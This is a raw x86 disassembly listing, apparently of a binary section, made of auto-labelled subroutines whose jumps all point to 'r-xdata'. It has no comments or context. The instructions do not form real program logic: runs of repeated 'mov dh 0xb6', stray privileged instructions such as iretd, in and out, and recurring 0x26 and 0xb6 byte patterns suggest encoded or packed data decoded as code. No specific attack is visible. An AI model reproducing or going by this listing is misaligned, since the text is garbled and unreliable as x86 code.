inc [ eax - 0x51 ]
arpl si si
iretd
outsd
aas
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x7f
iretd
sub_471919
or eax 0xb626261a
loope r-xdata
mov dh 0xb6
salc
push es
or [ esi + eax - 0x1f ] eax
arpl dx dx
add al 0x3
dec edx
push ebp
loope r-xdata
bound eax [ edx ]
jbe r-xdata
stosd [ edi ]
mov ebp 0x75262630
fnstenv [ eax + 0x2626268a ]
into
adc eax 0xcf7d78e6
fiadd [ esi + eax ]
add al 0x3
loope r-xdata
adc eax 0xef7d78e6
in eax 0xb6
jbe r-xdata
and [ esi - 0x32 ] cl
and eax 0x60cf2626
xor [ esi ] ah
mov dh 0xb6
mov dh 0xb6
jns r-xdata
fimul [ edx + 0x55 ]
add al 0x26
iretd
movsb [ edi ] [ esi ]
push ss
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
lodsd [ esi ]
loope r-xdata
push ebx
cli
iretd
jne r-xdata
in al 0x3
mov dh 0xb6
mov dh 0x73
iretd
sar [ ebx ] 0x1
mov dh 0xb6
mov dh 0xd9
mov cl 0x82
into
mov edx 0xcf262636
jge r-xdata
and dl [ esi ]
movsd [ edi ] es : [ esi ]
fisub [ edi ]
sub [ edx + 0x262600c5 ] esp
pop es
mov al 0x8a
into
jpe r-xdata
mov dh 0xb6
mov dh 0xd9
push ebx
xor ch [ ebp - 0x6b30d19d ]
sbb [ esi ] ah
adc eax 0xcf7d78e6
mov dh 0xb6
sub_47196b
out dx al
add [ esi ] ah
mov dh 0xb6
mov dh 0xb6
scasd [ edi ]
mov al [ 0x262626be ]
into
jpe r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
push ebx
xor ch [ ebp - 0x6b30d19d ]
sbb [ esi ] ah
adc eax 0xcf7d78e6
mov ebp 0x75262630
fnstenv [ eax + 0x2626268a ]
into
bound eax [ edx ]
jbe r-xdata
stosd [ edi ]
adc eax 0xef7d78e6
in eax 0xb6
jbe r-xdata
and [ esi - 0x32 ] cl
and eax 0x60cf2626
xor [ esi ] ah
mov dh 0xb6
mov dh 0xb6
jns r-xdata
movsb [ edi ] [ esi ]
push ss
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
lodsd [ esi ]
loope r-xdata
push ebx
cli
iretd
jne r-xdata
in al 0x3
mov dh 0xb6
mov dh 0x73
iretd
sar [ ebx ] 0x1
mov dh 0xb6
mov dh 0xd9
mov cl 0x82
mov edx 0xcf262636
jge r-xdata
into
and dl [ esi ]
movsd [ edi ] es : [ esi ]
fisub [ edi ]
sub [ edx + 0x262600c5 ] esp
pop es
mov al 0x8a
into
sub_4719d5
shl [ esi + 0x26 ] 0x1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
test [ edi + 0x6bafda7b ] ch
fisubr [ edi - 0x5b302d8d ]
in al 0x3
mov dh 0xb6
mov dh 0x73
iretd
sar [ ebx ] 0x1
mov dh 0xb6
mov dh 0xd9
mov cl 0x82
adc eax 0xef7d78e6
in eax 0xb6
jbe r-xdata
push ss
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x70
lodsd [ esi ]
loope r-xdata
movsb [ edi ] [ esi ]
push ebx
cli
iretd
sub_471a16
xor eax 0xb626260c
mov dh 0xe1
arpl dx bx
daa
lodsd [ es : esi ]
jne r-xdata
out dx eax
in eax 0x79
jge r-xdata
jpo r-xdata
jno r-xdata
iretd
dec eax
adc [ esi ] esp
mov dh 0xb6
mov dh 0xb6
jno r-xdata
mov dh 0xce
0xd1262609 0x3dfe
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
movsd [ edi ] es : [ esi ]
aad 0xd
mov dh 0x76
fst [ ebx - 0x6 ]
iretd
jo r-xdata
sar esi 0x1
cmp eax 0x37cf7fe6
pop ss
adc eax 0x11cf66e6
sbb [ esi ] esp
lodsb [ es : esi ]
adc eax 0x7baf40fd
fsubr [ ebp + 0x7baf40fc ]
xchg [ ebp + edx * 2 - 0x31 ] cl
mov bl 0x1a
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
mov dh [ esi + 0x26 ]
jg r-xdata
mov [ 0x26266a3e ] eax
jne r-xdata
aad 0x29
iretd
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9dbf2 ] eax
jbe r-xdata
xor ecx [ edx - 0x30d9d9da ]
call 0xffffffffb66d40ca
jno r-xdata
adc eax 0xef7d78e6
in eax 0xb6
mov dh 0xb6
mov dh 0x71
jbe r-xdata
sub [ ecx - 0x1ada9f9b ] edx
iretd
mov dh 0x40
fimul [ edi ]
mov dh 0xce
je r-xdata
scasd [ edi ]
inc eax
iretd
pushad
push 0xffffffce
insb
sub [ esi ] esp
lodsd [ es : esi ]
dec [ esi + 0x42 ]
mov al [ 0xffffffffcf7153d5 ]
mov [ 0xffffffffb6d9d9dd ] al
mov dh 0xb6
mov dh 0xb6
dec esp
dec ebx
iretd
arpl dx bx
js r-xdata
lodsd [ es : esi ]
loopne r-xdata
fst [ ebx - 0x32 ]
lodsd [ es : esi ]
fmulp st7
sub [ edx ] bl
mov dh 0xcf
fld [ esi + 0x26 ]
mov dh 0xa5
out 0x24 eax
jno r-xdata
mov dh 0xa7
push ds
jbe r-xdata
loop r-xdata
nop
xor al 0x26
movsd [ edi ] es : [ esi ]
aaa
iretd
fmul st7
inc esi
push 0x4eb62626
jmp r-xdata
lodsd [ es : esi ]
salc
adc eax 0x29d51dfd
sub [ es : ebx + 0x2626313d ] esp
lodsd [ esi ]
pop si
movsd [ edi ] [ esi ]
inc ebx
fisub [ esi ]
and eax 0x3a5eade7
lodsd [ esi ]
jle r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ebx - 0x3e ]
fnstenv [ ecx + 0x3a ]
jne r-xdata
popad
mov dh 0xb6
iretd
fstpnce st1
iretd
iretd
push ebx
into
sub_471a40
outsb
fcmovnu st1
fnstenv [ esi + 0x63761ea7 ]
popad
mov dh 0xb6
iretd
lodsd [ es : esi ]
arpl dx bx
js r-xdata
loopne r-xdata
jne r-xdata
out dx eax
in eax 0x79
jge r-xdata
mov dh 0xa7
push ds
jbe r-xdata
nop
xor al 0x26
movsd [ edi ] es : [ esi ]
jpo r-xdata
jno r-xdata
iretd
dec eax
adc [ esi ] esp
mov dh 0xb6
mov dh 0xb6
jno r-xdata
lodsd [ es : esi ]
salc
adc eax 0x29d51dfd
sub [ es : ebx + 0x2626313d ] esp
lodsd [ esi ]
pop si
movsd [ edi ] [ esi ]
inc ebx
fisub [ esi ]
and eax 0x3a5eade7
lodsd [ esi ]
jle r-xdata
mov [ 0x26266a3e ] eax
jne r-xdata
aad 0x29
iretd
mov dh 0xce
0xd1262609 0x3dfe
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
loop r-xdata
movsd [ edi ] es : [ esi ]
aad 0xd
mov dh 0x76
fst [ ebx - 0x6 ]
iretd
jo r-xdata
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9dbf2 ] eax
jbe r-xdata
xor ecx [ edx - 0x30d9d9da ]
call 0xffffffffb66d40ca
jno r-xdata
sar esi 0x1
cmp eax 0x37cf7fe6
pop ss
adc eax 0x11cf66e6
sbb [ esi ] esp
lodsb [ es : esi ]
adc eax 0x7baf40fd
fsubr [ ebp + 0x7baf40fc ]
xchg [ ebp + edx * 2 - 0x31 ] cl
mov bl 0x1a
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
mov dh [ esi + 0x26 ]
jg r-xdata
adc eax 0xef7d78e6
in eax 0xb6
mov dh 0xb6
mov dh 0x71
jbe r-xdata
sub [ ecx - 0x1ada9f9b ] edx
iretd
inc eax
iretd
pushad
push 0xffffffce
insb
sub [ esi ] esp
lodsd [ es : esi ]
dec [ esi + 0x42 ]
mov al [ 0xffffffffcf7153d5 ]
mov [ 0xffffffffb6d9d9dd ] al
mov dh 0xb6
mov dh 0xb6
dec esp
dec ebx
iretd
scasd [ edi ]
mov dh 0x40
fimul [ edi ]
mov dh 0xce
je r-xdata
fst [ ebx - 0x32 ]
lodsd [ es : esi ]
fmulp st7
sub [ edx ] bl
mov dh 0xcf
fld [ esi + 0x26 ]
mov dh 0xa5
out 0x24 eax
jno r-xdata
aaa
iretd
fmul st7
inc esi
push 0x4eb62626
jmp r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ebx - 0x3e ]
fnstenv [ ecx + 0x3a ]
jne r-xdata
fstpnce st1
iretd
iretd
push ebx
into
sub_471a61
xor ah [ ecx + 0x26 ]
mov dh 0xb6
lodsd [ es : esi ]
arpl dx bx
js r-xdata
loopne r-xdata
jne r-xdata
out dx eax
in eax 0x79
jge r-xdata
mov dh 0xa7
push ds
jbe r-xdata
nop
xor al 0x26
movsd [ edi ] es : [ esi ]
jpo r-xdata
jno r-xdata
iretd
dec eax
adc [ esi ] esp
mov dh 0xb6
mov dh 0xb6
jno r-xdata
lodsd [ es : esi ]
salc
adc eax 0x29d51dfd
sub [ es : ebx + 0x2626313d ] esp
lodsd [ esi ]
pop si
movsd [ edi ] [ esi ]
inc ebx
fisub [ esi ]
and eax 0x3a5eade7
lodsd [ esi ]
jle r-xdata
mov [ 0x26266a3e ] eax
jne r-xdata
aad 0x29
iretd
mov dh 0xce
0xd1262609 0x3dfe
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
loop r-xdata
movsd [ edi ] es : [ esi ]
aad 0xd
mov dh 0x76
fst [ ebx - 0x6 ]
iretd
jo r-xdata
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9dbf2 ] eax
jbe r-xdata
xor ecx [ edx - 0x30d9d9da ]
call 0xffffffffb66d40ca
jno r-xdata
adc eax 0xef7d78e6
in eax 0xb6
mov dh 0xb6
mov dh 0x71
jbe r-xdata
popad
mov dh 0xb6
iretd
sar esi 0x1
cmp eax 0x37cf7fe6
pop ss
adc eax 0x11cf66e6
sbb [ esi ] esp
lodsb [ es : esi ]
adc eax 0x7baf40fd
fsubr [ ebp + 0x7baf40fc ]
xchg [ ebp + edx * 2 - 0x31 ] cl
mov bl 0x1a
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
mov dh [ esi + 0x26 ]
jg r-xdata
sub [ ecx - 0x1ada9f9b ] edx
iretd
inc eax
iretd
pushad
push 0xffffffce
insb
sub [ esi ] esp
lodsd [ es : esi ]
dec [ esi + 0x42 ]
mov al [ 0xffffffffcf7153d5 ]
mov [ 0xffffffffb6d9d9dd ] al
mov dh 0xb6
mov dh 0xb6
dec esp
dec ebx
iretd
scasd [ edi ]
mov dh 0x40
fimul [ edi ]
mov dh 0xce
je r-xdata
fst [ ebx - 0x32 ]
lodsd [ es : esi ]
fmulp st7
sub [ edx ] bl
mov dh 0xcf
fld [ esi + 0x26 ]
mov dh 0xa5
out 0x24 eax
jno r-xdata
aaa
iretd
fmul st7
inc esi
push 0x4eb62626
jmp r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ebx - 0x3e ]
fnstenv [ ecx + 0x3a ]
jne r-xdata
fstpnce st1
iretd
iretd
push ebx
into
sub_471a8d
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9dbf2 ] eax
jbe r-xdata
inc eax
iretd
mov dh 0xce
0xd1262609 0x3dfe
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
sar esi 0x1
cmp eax 0x37cf7fe6
pop ss
adc eax 0x11cf66e6
sbb [ esi ] esp
lodsb [ es : esi ]
adc eax 0x7baf40fd
fsubr [ ebp + 0x7baf40fc ]
xchg [ ebp + edx * 2 - 0x31 ] cl
mov bl 0x1a
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
mov dh [ esi + 0x26 ]
jg r-xdata
scasd [ edi ]
jpo r-xdata
mov dh 0x40
fimul [ edi ]
mov dh 0xce
je r-xdata
fst [ ebx - 0x32 ]
lodsd [ es : esi ]
fmulp st7
sub [ edx ] bl
mov dh 0xcf
fld [ esi + 0x26 ]
mov dh 0xa5
out 0x24 eax
jno r-xdata
aaa
iretd
fmul st7
inc esi
push 0x4eb62626
jmp r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ebx - 0x3e ]
fnstenv [ ecx + 0x3a ]
jne r-xdata
fstpnce st1
iretd
iretd
push ebx
into
sub_471b11
push ecx
and [ esi ] esp
mov dh 0xce
0xd1262609 0x3dfe
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
sar esi 0x1
cmp eax 0x37cf7fe6
pop ss
adc eax 0x11cf66e6
sbb [ esi ] esp
lodsb [ es : esi ]
adc eax 0x7baf40fd
fsubr [ ebp + 0x7baf40fc ]
xchg [ ebp + edx * 2 - 0x31 ] cl
mov bl 0x1a
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
mov dh [ esi + 0x26 ]
jg r-xdata
mov dh 0x40
scasd [ edi ]
jpo r-xdata
fimul [ edi ]
mov dh 0xce
je r-xdata
fst [ ebx - 0x32 ]
lodsd [ es : esi ]
fmulp st7
sub [ edx ] bl
mov dh 0xcf
fld [ esi + 0x26 ]
mov dh 0xa5
out 0x24 eax
jno r-xdata
aaa
iretd
fmul st7
inc esi
push 0x4eb62626
jmp r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ebx - 0x3e ]
fnstenv [ ecx + 0x3a ]
jne r-xdata
fstpnce st1
iretd
iretd
push ebx
into
sub_471c05
adc [ eax ] esp
movsd [ edi ] es : [ esi ]
pop edx
add dh [ esi ]
xor cl bh
push ebp
add ah [ esi ]
lodsd [ es : esi ]
fadd [ eax - 0x51 ]
pop ebx
fcom [ 0x5baf40d9 ]
fidivr [ ecx - 0x31 ]
cmp eax 0xb626261f
mov dh 0xad
test al 0xe6
dec edi
out 0xa2 al
lodsd [ es : esi ]
mov bl 0xfa
fcmovnu st1
fldcw [ edi + 0x26a62eb2 ]
iretd
sub_471c9f
test eax 0xb626260b
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
imul ebx esp 0x4c
inc esp
lodsd [ esi ]
out dx al
inc eax
scasd [ edi ]
imul ebx edx 0xffffffcf
dec ecx
sbb [ esi ] ah
mov dh 0xa5
loop r-xdata
fcompp
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0x40
stosd [ edi ]
arpl si si
jbe r-xdata
or eax 0xb626262b
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jae r-xdata
arpl [ edx + 0x4c707076 ] sp
push es
iretd
sbb esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
dec esp
bound eax [ eax - 0x51 ]
arpl si bx
stosd [ edi ]
arpl [ edx - 0x61318990 ] sp
arpl [ esi ] sp
iretd
push edi
fstpnce st1
fnstenv [ esi + 0x1d23cf76 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
arpl dx ax
jle r-xdata
pop ds
adc dh [ edi ]
iretd
mov dh 0xb6
inc eax
push es
iretd
sub_471cfe
aaa
mov dh 0xa5
loop r-xdata
movsd [ edi ] [ esi ]
loop r-xdata
dec esi
cmpsb [ es : esi ] [ edi ]
iretd
mov [ ss : 0xffffffffdc88cfe6 ] eax
fstpnce st1
mov dh 0xb6
loope r-xdata
iretd
arpl [ esi ] di
jle r-xdata
fiadd [ edx + 0x4a ]
dec edx
or cl ah
arpl dx bx
inc edx
dec edx
dec edx
fnstenv [ es : esi + 0x5e ]
iretd
out 0x40 eax
scasd [ edi ]
arpl dx si
jle r-xdata
hlt
iretd
push ebp
iretd
sub_471d25
mov cl 0x71
scasd [ edi ]
pushad
push esi
into
int 0x2a
movsd [ edi ] es : [ esi ]
loop r-xdata
mov [ ss : 0xffffffffdc88cfe6 ] eax
fstpnce st1
mov dh 0xb6
loope r-xdata
iretd
arpl [ esi ] di
jle r-xdata
fiadd [ edx + 0x4a ]
dec edx
or cl ah
arpl dx bx
inc edx
dec edx
dec edx
fnstenv [ es : esi + 0x5e ]
iretd
out 0x40 eax
scasd [ edi ]
arpl dx si
jle r-xdata
hlt
iretd
push ebp
iretd
sub_471d3f
or ah [ esi ]
jne r-xdata
0xb6262631 0xadb6
and cl bh
add ebx [ edx ]
mov dh 0xb6
jo r-xdata
mov dh 0xb6
mov dh 0xb6
dec esi
mov bl 0xc3
inc esi
push cs
jg r-xdata
mov dh 0x73
lodsd [ esi ]
0xe8cf
out 0x29 al
mov [ 0x26263692 ] eax
into
cmp esi [ eax ]
iretd
sub_471d69
mov dh 0xb6
mov dh 0xb6
adc eax 0x18a1cfe6
mov dh 0x76
jne r-xdata
scasd [ edi ]
jpo r-xdata
iretd
and al 0x1e
mov dh 0xb6
mov dh 0x4c
inc esp
jle r-xdata
iretd
fcomp st1
fstp [ edi ]
jpo r-xdata
inc edx
inc eax
scasd [ edi ]
arpl si cx
jle r-xdata
jle r-xdata
sub [ edx - 0x26262314 ] esp
iretd
mov [ 0xffffffffd9d9dcec ] al
inc edi
inc eax
scasd [ edi ]
arpl sp cx
jle r-xdata
pop ebx
sub ah [ esi ]
iretd
dec eax
iretd
mov dh 0xb6
mov dh 0xb6
inc ecx
inc eax
scasd [ edi ]
arpl dx cx
jle r-xdata
mov dh 0xb6
mov dh 0xad
xchg ecx eax
inc ebx
iretd
sub_471dc8
salc
cdq
and ah [ edi ]
jno r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
imul ebx edx 0x77
jbe r-xdata
mov [ 0xffffffffd9d9de92 ] eax
iretd
xchg edx eax
into
cmp esi [ eax ]
iretd
salc
sub eax 0xb6b62626
jne r-xdata
iretd
0xb6262631 0xadb6
sub_471de6
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
jpo r-xdata
and al 0x1e
mov dh 0xb6
mov dh 0x4c
inc esp
jle r-xdata
iretd
fcomp st1
fstp [ edi ]
jpo r-xdata
inc edx
inc eax
scasd [ edi ]
arpl si cx
jle r-xdata
jle r-xdata
sub [ edx - 0x26262314 ] esp
iretd
mov [ 0xffffffffd9d9dcec ] al
inc edi
inc eax
scasd [ edi ]
arpl sp cx
jle r-xdata
pop ebx
sub ah [ esi ]
iretd
dec eax
iretd
mov dh 0xb6
mov dh 0xb6
inc ecx
inc eax
scasd [ edi ]
arpl dx cx
jle r-xdata
mov dh 0xb6
mov dh 0xad
xchg ecx eax
inc ebx
iretd
sub_471df1
test [ ebx ] esp
mov dh 0x40
scasd [ edi ]
arpl [ edx ] si
jle r-xdata
iretd
dec ecx
jl r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
movsd [ edi ] [ esi ]
pop edx
add dh [ edx ]
iretd
inc ebp
inc eax
scasd [ edi ]
arpl [ eax ] si
lodsd [ esi ]
in al 0x40
scasd [ edi ]
arpl [ esi ] di
jle r-xdata
out 0x40 eax
scasd [ edi ]
arpl dx si
jle r-xdata
hlt
iretd
push ebp
iretd
sub_471e3b
dec esp
inc edi
jle r-xdata
mov dh 0xb6
jg r-xdata
push eax
inc eax
scasd [ edi ]
arpl si dx
jle r-xdata
aad 0x29
mov [ 0xffffffffd9d9dc96 ] al
iretd
or [ eax - 0x51 ] al
imul edx edx 0x7f
dec esp
pop esi
inc eax
scasd [ edi ]
imul edx eax 0xffffffad
out dx al
inc eax
scasd [ edi ]
imul ebx esi 0x7f
iretd
push esi
iretd
sub_471e8a
mov dh 0xb6
jg r-xdata
aad 0x29
mov [ 0xffffffffd9d9dc96 ] al
iretd
or [ eax - 0x51 ] al
imul edx edx 0x7f
dec esp
pop esi
inc eax
scasd [ edi ]
imul edx eax 0xffffffad
out dx al
inc eax
scasd [ edi ]
imul ebx esi 0x7f
iretd
sub_471ea4
and ebx eax
fstpnce st1
mov dh 0xb6
ja r-xdata
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
arpl dx bx
jbe r-xdata
adc eax 0xdd1d70fd
sub [ edx - 0x26262306 ] esp
pop ds
jpo r-xdata
lodsd [ ss : esi ]
int1
iretd
mov dh 0x40
scasd [ edi ]
arpl ax cx
sub [ edx - 0x2626230b ] esp
pop ds
jpo r-xdata
pop ebx
sub ah [ esi ]
iretd
dec eax
iretd
jle r-xdata
sub [ edx - 0x26262314 ] esp
iretd
sub_471ed8
sbb eax 0x96a229d5
fcomp st1
fxch st7
dec esp
daa
mov dh 0x40
scasd [ edi ]
arpl ax cx
jle r-xdata
pop ebx
sub ah [ esi ]
iretd
dec eax
iretd
sub_471f64
loop r-xdata
adc eax 0x73af40e6
call 0xfffffffff0aaceda
inc eax
scasd [ edi ]
imul edx edx 0x4c
inc ebx
jle r-xdata
mov [ 0xffffffffcba229e6 ] eax
xor [ esi ] ah
adc eax 0x2d0cfe6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
dec esi

sub [ ebx + 0x262601ea ] esp
iretd
dec edx
inc eax
scasd [ edi ]
arpl ax dx
jle r-xdata
ja r-xdata
inc eax
inc eax
scasd [ edi ]
arpl si bx
jle r-xdata
mov cl 0xce
stosd [ edi ]
arpl si sp
iretd
inc eax
scasd [ edi ]
arpl sp cx
jle r-xdata
int3
or bh cl
cdq
xor esp [ esi ]
mov dh 0xce
js r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
xchg ecx eax
cli
iretd
add eax [ eax - 0x51 ]
arpl dx cx
jle r-xdata
fnstenv [ ecx + 0x7a ]
iretd
dec esi
fst [ ecx + 0x262626fa ]
iretd
dec edi
inc eax
scasd [ edi ]
arpl ax cx
iretd
sub_47200c
push 0x15262613
out 0x66 al
out dx eax
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
dec esp
or bh cl
pop edi
push ss
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
0xb3cf
sub_472038
in al dx
or eax 0xb6b62626
sub [ ebp + ebp * 4 + 0x7826262a ] esp
lodsd [ esi ]
loope r-xdata
mov dh 0xb6
mov dh 0xae
jpe r-xdata
jpo r-xdata
imul ecx eax 0xffffffab
arpl si sp
adc eax 0xcf7670ef
insb
mov dh 0xb6
lodsd [ esi ]
cld
dec esp
inc ebp
iretd
test [ ebp + 0x1bcf06d8 ] esp
sbb esp [ esi ]
mov dh 0xb6
mov dh 0x29
mov [ 0x26260ed5 ] al
movsd [ edi ] [ esi ]
pop ebx
fisub [ edx ]
sub [ edx + 0x26260ecf ] ebp
lodsd [ esi ]
outsb
and ch [ ecx ]
xchg ecx eax
das
iretd
mov bl 0x5
mov dh 0xb6
mov dh 0x75
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fst [ ecx + 0x262626fa ]
iretd
sub_4720bb
pop esi
pop es
mov dh 0xb6
mov dh 0xb6
mov dh 0xae
jpe r-xdata
imul ecx eax 0xffffffab
arpl si sp
adc eax 0xcf7670ef
insb
mov dh 0xb6
lodsd [ esi ]
cld
dec esp
inc ebp
iretd
test [ ebp + 0x1bcf06d8 ] esp
sbb esp [ esi ]
mov dh 0xb6
mov dh 0x29
mov [ 0x26260ed5 ] al
movsd [ edi ] [ esi ]
pop ebx
fisub [ edx ]
sub [ edx + 0x26260ecf ] ebp
lodsd [ esi ]
outsb
and ch [ ecx ]
xchg ecx eax
das
iretd
sub_4720ea
pop edx
sub eax 0xb6b62626
mov dh 0xb6
dec esp
xor al [ eax - 0x51 ]
arpl si bx
inc eax
scasd [ edi ]
imul ecx eax 0xffffffab
arpl si sp
adc eax 0xcf7670ef
insb
mov dh 0xb6
lodsd [ esi ]
cld
dec esp
inc ebp
iretd
sub_472150
fsubr [ edi ]
mov dh 0xa6
pop ebx
and al 0x29
mov [ 0x262624e9 ] eax
dec esp
jno r-xdata
push esi
inc eax
scasd [ edi ]
arpl si si
jle r-xdata
dec ecx
jle r-xdata
pushad
add cl dh
inc esp
dec esi
arpl [ esi ] dx
adc [ esi + 0x266187cf ] 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ edx - 0x26262cd7 ] esp
stosd [ edi ]
arpl [ esi ] si
scasd [ edi ]
arpl dx bx
iretd
dec esi
inc ebx
inc eax
scasd [ edi ]
arpl sp si
jle r-xdata
iretd
dec eax
iretd
sub_472174
or esp [ esi ]
mov dh 0xb6
mov dh 0xaf
pushad
jb r-xdata
iret
mov esi 0x4e26262e
cmp dh ah
0x60af71af 0xce46
lodsb [ esi ]
dec esi
pop edx
ja r-xdata
jpe r-xdata
dec esp
jno r-xdata
mov eax 0xaf71d42f
pushad
add cl dh
inc esp
dec esi
fstpnce st1
inc eax
scasd [ edi ]
imul edx esi 0xffffffad
out dx al
dec esp
or [ eax - 0x51 ] al
imul edx esp 0xffffffcf
dec ebp
cmp [ esi ] ah
mov dh 0xb6
stosd [ edi ]
arpl [ esi + 0x42a3ab76 ] dx
fstpnce st1
fnstenv [ esi + 0x70 ]
jo r-xdata
arpl si si
jle r-xdata
xchg esi eax
and esp [ esi ]
mov dh 0xb6
sub [ edx + 0x2626128a ] esp
iretd
mov dh 0xa5
pop edx
add dh [ edx ]
daa
sub [ edx + 0x2626262c ] esp
movsd [ edi ] [ esi ]
pop ecx
push es
daa
sub [ ebx + 0x262623dd ] esp
movsd [ edi ] [ esi ]
pop ecx
cmp ah [ edi ]
sub [ ebx + 0x262625c6 ] esp
stosd [ edi ]
mov [ 0x2626b602 ] al
push es
jo r-xdata
arpl [ esi ] dx
adc [ esi + 0x266187cf ] 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ edx - 0x26262cd7 ] esp
dec esi
inc ebx
inc eax
scasd [ edi ]
arpl sp si
jle r-xdata
iretd
jo r-xdata
iretd
dec eax
iretd
stosd [ edi ]
arpl [ esi ] si
scasd [ edi ]
arpl dx bx
iretd
cmp [ ecx ] cl
mov dh 0xb6
loope r-xdata
mov dh 0x26
iretd
0x6b70
sub_47226f
adc al 0x23
inc edx
lodsd [ esi ]
daa
lodsd [ esi ]
sub ch [ ebp + 0x26ad2a66 ]
lodsd [ esi ]
lodsd [ es : esi ]
scasw [ edi ]
and al [ edx ]
lodsd [ esi ]
and al [ edx ]
jg r-xdata
and esp [ esi ]
inc edx
mov dh 0x70
iretd
sub_4722a5
int1
or [ esi ] ah
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
arpl dx bp
jle r-xdata
out 0x29 al
mov [ 0x262634ca ] eax
stosd [ edi ]
pop ebx
dec ecx
jl r-xdata
0x2634
push ebx
iretd
sub_47233f
mov cl 0x2d
mov dh 0x40
scasd [ edi ]
jae r-xdata
mov dh 0x40
jl r-xdata
mov dh 0xb6
dec esp
push esp
lodsd [ esi ]
clc
inc eax
scasd [ edi ]
jpo r-xdata
push es
iretd
xor eax 0xaf719807
pushad
iretd
lodsd [ esi ]
dec bh
hlt
sub_47238f
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x4c
push esp
lodsd [ esi ]
clc
inc eax
scasd [ edi ]
jpo r-xdata
xor eax 0xaf719807
pushad
iretd
lodsd [ esi ]
dec bh
hlt
sub_4723d9
popad
outsd
mov dh 0xb6
mov dh 0xad
salc
sub [ eax - 0x6fd68ee0 ] edx
fmul [ 0x186acfe1 ]
pop ds
pop edx
add al [ esi ]
sub [ edx - 0x26262a37 ] esp
stosd [ edi ]
mov [ 0x2624be02 ] al
jbe r-xdata
fwait
retn 0xef15
loopne r-xdata
add esi [ 0xffffffffaf712626 ]
pushad
push es
into
and [ cs : esi ] ah
dec esi
mov cl 0x35
pop es
cwde
jno r-xdata
sub [ eax + eax * 8 + 0x61d9d9d9 ] esp
movsd [ edi ] [ esi ]
fldenv [ 0xffffffffd9f0a429 ]
fstpnce st1
iretd
pushad
iretd
sub_47241c
mov eax 0xb6262638
mov dh 0x40
scasd [ edi ]
arpl si cx
jle r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
jpo r-xdata
push es
iretd
stosd [ edi ]
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
arpl ax bx
dec esi
and ah [ edi ]
stosd [ edi ]
mov [ 0xffffffffd9d9db96 ] eax
iretd
iretd
jbe r-xdata
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
dec esp
push eax
iretd
adc eax 0x7baf40fd
jl r-xdata
stc
inc eax
scasd [ edi ]
jpo r-xdata
lodsd [ esi ]
jge r-xdata
mov [ 0x2626b202 ] al
jbe r-xdata
mov dh 0x29
mov [ 0x26260d5d ] eax
dec esi
and ah [ edi ]
